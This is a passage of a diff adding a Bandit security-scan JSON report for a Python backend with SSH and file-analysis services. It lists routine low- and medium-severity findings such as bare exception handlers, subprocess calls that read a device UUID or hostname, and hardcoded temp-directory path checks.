+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 275,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\skill_matcher.py": {
+      "CONFIDENCE.HIGH": 3,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 3,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 469,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\skill_md_parser.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 160,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\ssh_connection_manager.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 118,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\ssh_manager.py": {
+      "CONFIDENCE.HIGH": 3,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 4,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 725,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\theme_manager.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 59,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\window_manager.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 25,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\utils\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\utils\\crypto.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 36,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\utils\\system_fonts.py": {
+      "CONFIDENCE.HIGH": 4,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 4,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 81,
+      "nosec": 0,
+      "skipped_tests": 0
+    }
+  },
+  "results": [
+    {
+      "code": "19             await ssh_manager.disconnect()\n20     except Exception:\n21         pass\n22     print(\"SDIT Python \u540e\u7aef\u5df2\u5173\u95ed\")\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\main.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 20,
+      "line_range": [
+        20,
+        21
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "133                         await websocket.close(code=1011, reason=f\"SSH\u901a\u9053\u5f02\u5e38: {e}\")\n134                     except Exception:\n135                         pass\n136                     return\n",
+      "col_offset": 20,
+      "end_col_offset": 28,
+      "filename": "app\\main.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 134,
+      "line_range": [
+        134,
+        135
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "152                             await websocket.close(code=1011, reason=\"SSH\u4f1a\u8bdd\u5df2\u4e22\u5931\")\n153                         except Exception:\n154                             pass\n155                         return\n",
+      "col_offset": 24,
+      "end_col_offset": 32,
+      "filename": "app\\main.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 153,
+      "line_range": [
+        153,
+        154
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "214                     await websocket.close(code=1011, reason=f\"SSH\u5199\u5165\u5931\u8d25: {e}\")\n215                 except Exception:\n216                     pass\n217                 break\n",
+      "col_offset": 16,
+      "end_col_offset": 24,
+      "filename": "app\\main.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 215,
+      "line_range": [
+        215,
+        216
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "409             return response.json()\n410         except Exception:\n411             pass\n412     text = response.text if response.text is not None else \"\"\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\routers\\api.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 410,
+      "line_range": [
+        410,
+        411
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "514         root.attributes(\"-topmost\", True)\n515     except Exception:\n516         pass\n517     root.update()\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\routers\\api.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 515,
+      "line_range": [
+        515,
+        516
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "1177             file.file.close()\n1178         except Exception:\n1179             pass\n1180         if tmp_path:\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\routers\\api.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 1178,
+      "line_range": [
+        1178,
+        1179
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "1 import platform\n2 import subprocess\n3 from typing import Optional\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 2,
+      "line_range": [
+        2
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "6     try:\n7         result = subprocess.run(\n8             [\"powershell\", \"-NoProfile\", \"-Command\",\n9              \"(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID\"],\n10             capture_output=True, text=True, timeout=10,\n11             creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, \"CREATE_NO_WINDOW\") else 0,\n12         )\n13         if result.returncode == 0 and result.stdout.strip():\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 7,
+      "line_range": [
+        7,
+        8,
+        9,
+        10,
+        11,
+        12
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "6     try:\n7         result = subprocess.run(\n8             [\"powershell\", \"-NoProfile\", \"-Command\",\n9              \"(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID\"],\n10             capture_output=True, text=True, timeout=10,\n11             creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, \"CREATE_NO_WINDOW\") else 0,\n12         )\n13         if result.returncode == 0 and result.stdout.strip():\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 7,
+      "line_range": [
+        7,
+        8,
+        9,
+        10,
+        11,
+        12
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "14             return result.stdout.strip()\n15     except Exception:\n16         pass\n17     return \"unknown\"\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 15,
+      "line_range": [
+        15,
+        16
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "19     try:\n20         result = subprocess.run(\n21             [\"ioreg\", \"-rd1\", \"-c\", \"IOPlatformExpertDevice\"],\n22             capture_output=True, text=True, timeout=10,\n23         )\n24         if result.returncode == 0:\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 20,
+      "line_range": [
+        20,
+        21,
+        22,
+        23
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "19     try:\n20         result = subprocess.run(\n21             [\"ioreg\", \"-rd1\", \"-c\", \"IOPlatformExpertDevice\"],\n22             capture_output=True, text=True, timeout=10,\n23         )\n24         if result.returncode == 0:\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 20,
+      "line_range": [
+        20,
+        21,
+        22,
+        23
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "29                         return parts[3]\n30     except Exception:\n31         pass\n32     return \"unknown\"\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 30,
+      "line_range": [
+        30,
+        31
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "36             return f.read().strip()\n37     except Exception:\n38         pass\n39     try:\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 37,
+      "line_range": [
+        37,
+        38
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "41             return f.read().strip()\n42     except Exception:\n43         pass\n44     try:\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 42,
+      "line_range": [
+        42,
+        43
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "44     try:\n45         result = subprocess.run(\n46             [\"dmidecode\", \"-s\", \"system-uuid\"],\n47             capture_output=True, text=True, timeout=10,\n48         )\n49         if result.returncode == 0 and result.stdout.strip():\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 45,
+      "line_range": [
+        45,
+        46,
+        47,
+        48
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "44     try:\n45         result = subprocess.run(\n46             [\"dmidecode\", \"-s\", \"system-uuid\"],\n47             capture_output=True, text=True, timeout=10,\n48         )\n49         if result.returncode == 0 and result.stdout.strip():\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 45,
+      "line_range": [
+        45,
+        46,
+        47,
+        48
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "50             return result.stdout.strip()\n51     except Exception:\n52         pass\n53     return \"unknown\"\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 51,
+      "line_range": [
+        51,
+        52
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "66         try:\n67             result = subprocess.run(\n68                 [\"hostname\"], capture_output=True, text=True, timeout=5,\n69                 creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, \"CREATE_NO_WINDOW\") else 0,\n70             )\n71             if result.returncode == 0:\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 67,
+      "line_range": [
+        67,
+        68,
+        69,
+        70
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "66         try:\n67             result = subprocess.run(\n68                 [\"hostname\"], capture_output=True, text=True, timeout=5,\n69                 creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, \"CREATE_NO_WINDOW\") else 0,\n70             )\n71             if result.returncode == 0:\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 67,
+      "line_range": [
+        67,
+        68,
+        69,
+        70
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "72                 return result.stdout.strip()\n73         except Exception:\n74             pass\n75     elif system == \"darwin\":\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 73,
+      "line_range": [
+        73,
+        74
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "76         try:\n77             result = subprocess.run(\n78                 [\"scutil\", \"--get\", \"ComputerName\"],\n79                 capture_output=True, text=True, timeout=5,\n80             )\n81             if result.returncode == 0:\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 77,
+      "line_range": [
+        77,
+        78,
+        79,
+        80
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "76         try:\n77             result = subprocess.run(\n78                 [\"scutil\", \"--get\", \"ComputerName\"],\n79                 capture_output=True, text=True, timeout=5,\n80             )\n81             if result.returncode == 0:\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 77,
+      "line_range": [
+        77,
+        78,
+        79,
+        80
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "82                 return result.stdout.strip()\n83         except Exception:\n84             pass\n85     elif system == \"linux\":\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 83,
+      "line_range": [
+        83,
+        84
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "88                 return f.read().strip()\n89         except Exception:\n90             pass\n91         try:\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 89,
+      "line_range": [
+        89,
+        90
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "91         try:\n92             result = subprocess.run(\n93                 [\"hostname\"], capture_output=True, text=True, timeout=5,\n94             )\n95             if result.returncode == 0:\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 92,
+      "line_range": [
+        92,
+        93,
+        94
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "91         try:\n92             result = subprocess.run(\n93                 [\"hostname\"], capture_output=True, text=True, timeout=5,\n94             )\n95             if result.returncode == 0:\n",
+      "col_offset": 21,
+      "end_col_offset": 13,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 92,
+      "line_range": [
+        92,
+        93,
+        94
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "96                 return result.stdout.strip()\n97         except Exception:\n98             pass\n99     return platform.node() or \"Unknown Device\"\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\device_info.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 97,
+      "line_range": [
+        97,
+        98
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "251                             self._matrix = m\n252                     except Exception:\n253                         pass\n254             else:\n",
+      "col_offset": 20,
+      "end_col_offset": 28,
+      "filename": "app\\services\\experience_store\\store.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 252,
+      "line_range": [
+        252,
+        253
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "407                             self._matrix = np.delete(m_arr, i, axis=0)\n408                     except Exception:\n409                         pass\n410                 self._persist_cache()\n",
+      "col_offset": 20,
+      "end_col_offset": 28,
+      "filename": "app\\services\\experience_store\\store.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 408,
+      "line_range": [
+        408,
+        409
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "173         suspicious_patterns = {\n174             \"/tmp/\": \"\u4e34\u65f6\u76ee\u5f55\",\n175             \"/dev/shm/\": \"\u5171\u4eab\u5185\u5b58\u76ee\u5f55\",\n176             \"/var/tmp/\": \"\u6301\u4e45\u4e34\u65f6\u76ee\u5f55\",\n177             \"..\": \"\u8def\u5f84\u7a7f\u8d8a\",\n178         }\n179         found = []\n180         for pattern, desc in suspicious_patterns.items():\n",
+      "col_offset": 12,
+      "end_col_offset": 19,
+      "filename": "app\\services\\file_analysis.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 174,
+      "line_range": [
+        173,
+        174,
+        175,
+        176,
+        177,
+        178
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "174             \"/tmp/\": \"\u4e34\u65f6\u76ee\u5f55\",\n175             \"/dev/shm/\": \"\u5171\u4eab\u5185\u5b58\u76ee\u5f55\",\n176             \"/var/tmp/\": \"\u6301\u4e45\u4e34\u65f6\u76ee\u5f55\",\n177             \"..\": \"\u8def\u5f84\u7a7f\u8d8a\",\n178         }\n179         found = []\n180         for pattern, desc in suspicious_patterns.items():\n181             if pattern in path:\n",
+      "col_offset": 12,
+      "end_col_offset": 23,
+      "filename": "app\\services\\file_analysis.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 175,
+      "line_range": [
+        173,
+        174,
+        175,
+        176,
+        177,
+        178
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "175             \"/dev/shm/\": \"\u5171\u4eab\u5185\u5b58\u76ee\u5f55\",\n176             \"/var/tmp/\": \"\u6301\u4e45\u4e34\u65f6\u76ee\u5f55\",\n177             \"..\": \"\u8def\u5f84\u7a7f\u8d8a\",\n178         }\n179         found = []\n180         for pattern, desc in suspicious_patterns.items():\n181             if pattern in path:\n182                 found.append(f\"  \u5339\u914d: {pattern} \u2192 {desc}\")\n",
+      "col_offset": 12,
+      "end_col_offset": 23,
+      "filename": "app\\services\\file_analysis.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 176,
+      "line_range": [
